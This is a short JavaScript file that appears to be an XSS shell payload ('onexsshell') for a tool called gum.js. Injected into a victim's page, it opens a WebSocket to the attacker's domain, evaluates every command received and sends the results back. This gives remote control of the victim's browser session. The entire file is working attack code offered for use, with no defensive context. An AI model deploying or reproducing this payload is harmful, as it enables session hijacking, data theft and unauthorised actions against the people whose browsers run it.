/*
    quininer - 140502
    onexsshell - gum.js
        - xss shell
            gum.script('http://' + gum.domain + '/static/brows/onexsshell.js')
        and
            console

*/

if(!window.WebSocket){
    if(window.MozWebSocket){
        window.WebSocket = window.MozWebSocket;
    };
};
xss_shell_connect = new window.WebSocket('ws://' + gum.domain + '/connect');
xss_shell_connect.onmessage = function(command){
    try{
        xss_shell_connect.send(eval(command.data));
    }catch(e){
        xss_shell_connect.send(e);
    }
};
